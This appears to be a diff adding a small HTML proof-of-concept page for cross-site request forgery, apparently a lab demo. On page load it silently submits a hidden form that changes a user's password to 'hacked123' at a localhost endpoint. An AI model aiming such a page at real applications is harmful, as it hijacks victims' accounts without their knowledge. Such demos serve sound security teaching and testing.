@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Auto Submit</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <h2>CSRF Auto Submission Demo</h2>
+  <form action="http://localhost:8080/change-password" method="POST">
+    <input type="hidden" name="password" value="hacked123" />
+  </form>
+</body>
+</html>
